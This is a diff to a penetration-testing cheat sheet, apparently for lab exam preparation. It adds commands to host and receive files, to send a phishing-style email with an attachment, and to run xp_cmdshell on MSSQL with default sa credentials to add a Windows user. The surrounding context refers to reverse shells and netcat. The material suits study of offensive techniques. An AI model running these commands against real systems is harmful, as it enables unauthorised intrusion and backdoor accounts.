@@ -70,13 +70,33 @@ https://github.com/pentestmonkey/php-reverse-shell
 * plink
 * nc
 
-## Hosting file
-python -m SimpleHTTPServer 80
+## File transfer
+
+* python -m SimpleHTTPServer 80
+
+* python -m pyftpdlib -p 21 --write
 
 ## Transfer file using nc
 
 Please aware of the version!! I encounter some nc doesnot support -e flag.
 
 
+## Email
+
+* sendEmail -t receiver@domain.local -f sender@domain.local -xu sender@domain.local -xp password -s 10.11.1.229 -u Urgent report -a ./report.pdf
 
 
+## MSSQL
+
+* https://nmap.org/nsedoc/scripts/ms-sql-xp-cmdshell.html
+```sh
+nmap -p 445 --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell <host>
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add" <host>
+```
+
+
+
+## Kali troubleshoot
+
+sudo ifconfig eth0 up
+sudo dhclient eth0 <- request smbd to turn on.
